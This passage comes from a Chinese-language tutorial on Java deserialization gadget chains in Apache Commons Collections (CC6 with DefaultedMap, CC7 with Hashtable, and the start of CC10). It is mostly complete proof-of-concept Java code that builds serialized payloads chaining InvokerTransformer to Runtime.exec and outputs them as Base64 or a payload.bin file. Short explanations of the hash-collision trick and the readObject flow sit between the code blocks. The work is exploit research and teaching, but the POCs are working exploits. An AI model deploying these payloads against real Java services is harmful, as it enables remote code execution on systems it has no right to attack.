            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);
        <span class="hljs-comment">/*jdk1.7~jdk1.8*/</span>
        Map expMap = <span class="hljs-keyword">new</span> HashMap();
        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;valuevalue&quot;</span>);
        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">// serialize</span>
            ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
            ObjectOutputStream objectoutputstream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
            objectoutputstream.writeObject(expMap);
            objectoutputstream.close();
            <span class="hljs-comment">// unserialize</span>
            ObjectInputStream objectinputstream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
            objectinputstream.readObject();
            objectinputstream.close();
            System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<h3 id="&#x1F6A9;cc9defaultedmap">&#x1F6A9;CC9_DefaultedMap</h3>
<p>LazyMap&#x56E0;&#x4E3A;&#x7528;&#x7684;&#x592A;&#x5E7F;&#x800C;&#x5DF2;&#x88AB;&#x91CD;&#x89C6;, &#x6240;&#x4EE5;&#x91C7;&#x53D6;&#x4E86;DefaultedMap&#x4EE3;&#x66FF;LazyMap, &#x5B83;&#x62E5;&#x6709;&#x548C;LazyMap&#x540C;&#x6837;&#x7684;&#x7279;&#x6027;</p>
<pre><code class="lang-java"><span class="hljs-comment">// DefaultedMap.get</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>{
        <span class="hljs-comment">// create value for key if key is not currently in the map</span>
        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) {
            <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> Transformer) {
                <span class="hljs-keyword">return</span> ((Transformer) value).transform(key);
            }
            <span class="hljs-keyword">return</span> value;
        }
        <span class="hljs-keyword">return</span> map.get(key);
    }
</code></pre>
<p>&#x53EA;&#x8981;&#x51FA;&#x73B0;LazyMap&#x7684;&#x5730;&#x65B9;&#x90FD;&#x53EF;&#x66FF;&#x6362;&#x4E3A;DefaultedMap</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6_DefaultedMap</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = DefaultedMap.decorate(innerMap, chainedTransformer);
        <span class="hljs-comment">/**DefaultedMap.get*/</span>
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);
        <span class="hljs-comment">/*jdk1.7~jdk1.8*/</span>
        Map expMap = <span class="hljs-keyword">new</span> HashMap();
        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;valuevalue&quot;</span>);
        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">// serialize</span>
            ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
            ObjectOutputStream objectoutputstream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
            objectoutputstream.writeObject(expMap);
            objectoutputstream.close();
            <span class="hljs-comment">// unserialize</span>
            ObjectInputStream objectinputstream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
            objectinputstream.readObject();
            objectinputstream.close();
            System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<h2 id="cc7-hashtable">CC7_ Hashtable</h2>
<p>CommonsCollections7&#x7528;&#x4E86;Hashtable&#x6765;&#x4EE3;&#x66FF;<code>AnnotationInvocationHandler</code>&#xFF0C;&#x4E0D;&#x540C;&#x4E8E;&#x524D;&#x9762;&#x4E24;&#x79CD;CommonsCollections7&#x5E76;&#x672A;&#x4F7F;&#x7528;<code>TiredMapEntry</code>&#xFF0C;&#x800C;&#x662F;&#x7528;&#x4E86;&#x76F8;&#x540C;key&#x51B2;&#x7A81;&#x7684;&#x65B9;&#x5F0F;&#x8C03;&#x7528;<code>equals</code>&#x6765;&#x89E6;&#x53D1;<code>Lazy.get</code>&#x51FD;&#x6570;</p>
<p>&#x672C;&#x6B21;&#x6839;&#x636E;POC&#x6765;&#x8FDB;&#x884C;&#x5206;&#x6790;, &#x5148;&#x7ED9;&#x51FA;&#x5B8C;&#x6574;&#x7684;POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Hashtable;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC7_Hashtable</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-comment">/**&#x4E0D;&#x80FD;&#x52A0; new ConstantTransformer(1) &#x4F1A;&#x5F71;&#x54CD;payload&#x89E6;&#x53D1;*/</span>
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-comment">/*new ConstantTransformer(1)*/</span>};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);

        Map innerMap1 = <span class="hljs-keyword">new</span> HashMap();
        Map innerMap2 = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
        <span class="hljs-comment">/**&#x51B2;&#x7A81;&#x662F;&#x6D4B;&#x8BD5;&#x540E;&#x5199;&#x597D;&#x7684;,&#x4E0D;&#x80FD;&#x4E71;&#x6539;*/</span>
        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);

        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);

        <span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span>
        Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();
        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);
        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-comment">// Needed to ensure hash collision after previous manipulations</span>
        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);

        <span class="hljs-comment">// &#x5B57;&#x8282;&#x8C03;&#x7528;&#x5199;&#x6CD5;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(hashtable);
        oos.close();
        System.out.println(Base64.encodeBase64String(barr.toByteArray()));
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();

        <span class="hljs-comment">// &#x5199;&#x6587;&#x4EF6;&#x5199;&#x6CD5;</span>
        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.flush();
        objectOutputStream.close();
        FileInputStream fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);
        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
</code></pre>
<h3 id="hashtable&#x7684;&#x91CD;&#x590D;&#x64CD;&#x4F5C;">Hashtable&#x7684;&#x91CD;&#x590D;&#x64CD;&#x4F5C;</h3>
<pre><code class="lang-java">Map innerMap1 = <span class="hljs-keyword">new</span> HashMap();
Map innerMap2 = <span class="hljs-keyword">new</span> HashMap();
<span class="hljs-comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);
<span class="hljs-comment">/**&#x51B2;&#x7A81;&#x662F;&#x6D4B;&#x8BD5;&#x540E;&#x5199;&#x597D;&#x7684;,&#x4E0D;&#x80FD;&#x4E71;&#x6539;*/</span>
lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);

Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);

<span class="hljs-comment">// Use the colliding Maps as keys in Hashtable</span>
Hashtable hashtable = <span class="hljs-keyword">new</span> Hashtable();
hashtable.put(lazyMap1, <span class="hljs-number">1</span>);
hashtable.put(lazyMap2, <span class="hljs-number">2</span>);
</code></pre>
<p>&#x5728;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x5B9E;&#x4F8B;&#x5316;&#x4E86;&#x4E24;&#x4E2A;<code>HashMap</code>&#xFF0C;&#x5E76;&#x5BF9;&#x4E24;&#x4E2A;<code>HashMap</code>&#x4F7F;&#x7528;&#x4E86;<code>LazyMap</code>&#x5C06;<code>transformerChain</code>&#x548C;<code>HashMap</code>&#x7ED1;&#x5B9A;&#x5230;&#x4E00;&#x8D77;&#x3002;&#x7136;&#x540E;&#x5206;&#x522B;&#x6DFB;&#x52A0;&#x5230;<code>Hashtable</code>&#x4E2D;&#xFF0C; &#x4F46;&#x662F;&#x524D;&#x9762;&#x770B;&#x5230;&#x7684;&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x4E00;&#x6B21;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x91CD;&#x590D;2&#x6B21;&#x91CD;&#x590D;&#x7684;&#x64CD;&#x4F5C;&#x5462;&#xFF1F;</p>
<p>&#x4ECE;Hashtable.readObject&#x8DDF;&#x8FDB;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>
         <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException
    </span>{
        <span class="hljs-comment">// Read in the length, threshold, and loadfactor</span>
        s.defaultReadObject();

        <span class="hljs-comment">// set hashSeed</span>
        UNSAFE.putIntVolatile(<span class="hljs-keyword">this</span>, HASHSEED_OFFSET,
                sun.misc.Hashing.randomHashSeed(<span class="hljs-keyword">this</span>));

        <span class="hljs-comment">// Read the original length of the array and number of elements</span>
        <span class="hljs-keyword">int</span> origlength = s.readInt();
        <span class="hljs-keyword">int</span> elements = s.readInt();

        <span class="hljs-comment">// Compute new size with a bit of room 5% to grow but</span>
        <span class="hljs-comment">// no larger than the original size.  Make the length</span>
        <span class="hljs-comment">// odd if it&apos;s large enough, this helps distribute the entries.</span>
        <span class="hljs-comment">// Guard against the length ending up zero, that&apos;s not valid.</span>
        <span class="hljs-keyword">int</span> length = (<span class="hljs-keyword">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;
        <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)
            length--;
        <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)
            length = origlength;

        Entry&lt;K,V&gt;[] table = <span class="hljs-keyword">new</span> Entry[length];
        threshold = (<span class="hljs-keyword">int</span>) Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);
        count = <span class="hljs-number">0</span>;
        useAltHashing = sun.misc.VM.isBooted() &amp;&amp;
                (length &gt;= Holder.ALTERNATIVE_HASHING_THRESHOLD);

        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span>
        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) {
            K key = (K)s.readObject();
            V value = (V)s.readObject();
            <span class="hljs-comment">// synch could be eliminated for performance</span>
            reconstitutionPut(table, key, value);
        }
        <span class="hljs-keyword">this</span>.table = table;
    }
</code></pre>
<p><code>Hashtable</code>&#x7684;<code>reconstitutionPut</code>&#x65B9;&#x6CD5;&#x662F;&#x88AB;&#x904D;&#x5386;&#x8C03;&#x7528;&#x7684;</p>
<p><img src="img/1642080346736.png" alt="1642080346736"></p>
<p>&#x7B2C;&#x4E00;&#x6B21;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x8D70;&#x5165;&#x5230;<code>reconstitutionPut</code>&#x65B9;&#x6CD5;for&#x5FAA;&#x73AF;&#x91CC;&#x9762;&#xFF0C;&#x56E0;&#x4E3A;<code>tab[index]</code>&#x7684;&#x5185;&#x5BB9;&#x662F;&#x7A7A;&#x7684;&#xFF0C;&#x5728;&#x4E0B;&#x9762;&#x4F1A;&#x5BF9;<code>tab[index]</code>&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x3002;&#x5728;&#x7B2C;&#x4E8C;&#x6B21;&#x8C03;&#x7528;<code>reconstitutionPut</code>&#x65F6;&#xFF0C;tab&#x4E2D;&#x624D;&#x6709;&#x5185;&#x5BB9;&#xFF0C;&#x6211;&#x4EEC;&#x624D;&#x6709;&#x673A;&#x4F1A;&#x8FDB;&#x5165;&#x5230;&#x8FD9;&#x4E2A;for&#x5FAA;&#x73AF;&#x4E2D;&#xFF0C;&#x4ECE;&#x800C;&#x8C03;&#x7528;<code>equals</code>&#x65B9;&#x6CD5;&#x3002;&#x8FD9;&#x4E5F;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8C03;&#x7528;&#x4E24;&#x6B21;put&#x7684;&#x539F;&#x56E0;&#x3002;</p>
<p><img src="img/1642081420940.png" alt="1642081420940"> </p>
<p>&#x8FD9;&#x91CC;&#x7684;<code>equals</code>&#x51FD;&#x6570;&#x53D6;&#x51B3;&#x4E8E;<code>key</code>&#x7684;&#x5BF9;&#x8C61;&#xFF0C;&#x5229;&#x7528;&#x94FE;&#x7528;&#x7684;&#x662F;<code>LazyMap</code>&#x5BF9;&#x8C61;&#xFF0C;&#x5B9E;&#x9645;&#x8C03;&#x7528;&#x7684;&#x662F;&#x7236;&#x7C7B;<code>AbstractMapDecorator</code>&#x7684;<code>equals</code>&#x51FD;&#x6570; </p>
<pre><code>    public boolean equals(Object object) {
        if (object == this) {
            return true;
        }
        return map.equals(object);
    }
</code></pre><p>&#x8FD9;&#x91CC;&#x53C8;&#x8C03;&#x7528;&#x4E86;map&#x7684;equals&#x51FD;&#x6570;&#xFF0C;&#x8FD9;&#x91CC;&#x5B9E;&#x9645;&#x8C03;&#x7528;&#x7684;&#x662F;HashMap&#x7684;&#x7236;&#x7C7B;<code>AbstractMap</code>&#x7684;<code>equals</code>&#x51FD;&#x6570;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object o)</span> </span>{
        <span class="hljs-keyword">if</span> (o == <span class="hljs-keyword">this</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;

        <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        <span class="hljs-comment">// o&#x8D4B;&#x503C;&#x7ED9;m, &#x503C;&#x4E3A;LazyMap&#x5BF9;&#x8C61;</span>
        Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;
        <span class="hljs-keyword">if</span> (m.size() != size())
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;

        <span class="hljs-keyword">try</span> {
            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();
            <span class="hljs-keyword">while</span> (i.hasNext()) {
                Entry&lt;K,V&gt; e = i.next();
                <span class="hljs-comment">// key = &quot;yy&quot;;value = 1;</span>
                K key = e.getKey();
                V value = e.getValue();
                <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) {
                    <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-keyword">null</span> &amp;&amp; m.containsKey(key)))
                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// &#x89E6;&#x53D1;LazyMap.get</span>
                    <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))
                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
                }
            }
        } <span class="hljs-keyword">catch</span> (ClassCastException unused) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        } <span class="hljs-keyword">catch</span> (NullPointerException unused) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
        }

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }
</code></pre>
<p>&#x540E;&#x7EED;&#x5C31;&#x662F;&#x89E6;&#x53D1;LazyMap.get</p>
<h3 id="lazymap2removeyy">lazyMap2.remove(&quot;yy&quot;);</h3>
<p>&#x81F3;&#x4E8E;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x5728;&#x6700;&#x540E;&#x9762;&#x79FB;&#x9664;&#x8BE5;&#x503C;&#xFF0C;&#x5176;&#x5B9E;&#x5728;<code>LazyMap</code>&#x7684;get&#x65B9;&#x6CD5;&#x91CC;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230; </p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>{
        <span class="hljs-comment">// create value for key if key is not currently in the map</span>
        <span class="hljs-comment">// &#x5305;&#x542B;&#x952E;&#x503C;&#x5C06;&#x65E0;&#x6CD5;&#x8FDB;&#x5165;if&#x8BED;&#x53E5;&#x4E2D;</span>
        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-keyword">false</span>) {
            Object value = factory.transform(key);
            map.put(key, value);
            <span class="hljs-keyword">return</span> value;
        }
        <span class="hljs-keyword">return</span> map.get(key);
    }
</code></pre>
<p>&#x5982;&#x679C;&#x4E0D;&#x79FB;&#x9664;&#x8BE5;&#x65B9;&#x6CD5;&#x5C31;&#x4F1A;&#x8D70;&#x4E0D;&#x8FDB;&#x8BE5;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#x7684;&#x4EE3;&#x7801;&#x5757;&#x4E2D;&#x3002;&#x800C;&#x540E;&#x9762;&#x4E5F;&#x4F1A;&#x518D;&#x8C03;&#x7528;&#x4E00;&#x6B21;put&#x65B9;&#x6CD5;&#x3002; </p>
<h3 id="&#x8C03;&#x7528;&#x7684;&#x4E24;&#x6B21;put&#x5176;&#x4E2D;map&#x4E2D;key&#x7684;&#x503C;&#x5206;&#x522B;&#x4E3A;yy&#x548C;zz">&#x8C03;&#x7528;&#x7684;&#x4E24;&#x6B21;put&#x5176;&#x4E2D;map&#x4E2D;key&#x7684;&#x503C;&#x5206;&#x522B;&#x4E3A;yy&#x548C;zZ</h3>
<p>&#x8FD9;&#x91CC;index&#x7684;&#x8BA1;&#x7B97;&#x65B9;&#x5F0F;&#x5173;&#x952E;&#x662F;hash&#xFF0C;&#x800C;hash&#x662F;&#x901A;&#x8FC7;key.hashCode&#x5F97;&#x6765;&#x7684;&#xFF0C;&#x5728;java&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x5C0F;bug&#xFF1A;</p>
<pre><code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()
</code></pre><p>&#x6B63;&#x662F;&#x8FD9;&#x4E2A;&#x5C0F;bug&#x8BA9;&#x8FD9;&#x91CC;&#x80FD;&#x591F;&#x5229;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x5C06;map&#x4E2D;put&#x7684;&#x503C;&#x8BBE;&#x7F6E;&#x4E3A;yy&#x548C;zZ&#xFF0C;&#x4F7F;&#x4E24;&#x6B21;&#x8BA1;&#x7B97;&#x7684;index&#x90FD;&#x4E00;&#x6837;&#xFF0C;&#x624D;&#x80FD;&#x591F;&#x8FDB;&#x5165;&#x5230;for&#x5FAA;&#x73AF;&#x4E2D;&#x3002;</p>
<h2 id="cc10mixed-with-cc6-and-cc7">CC10_mixed with CC6 and CC7</h2>
<p>&#x770B;&#x5230; Hashtable.reconstitutionPut &#x4E2D;&#x7684;&#x6709;&#x4E00;&#x5904; hashCode &#x7684;&#x8C03;&#x7528;</p>
<pre><code class="lang-java"><span class="hljs-keyword">int</span> hash = hash(key);
<span class="hljs-comment">// &#x8DDF;&#x8FDB;hash</span>
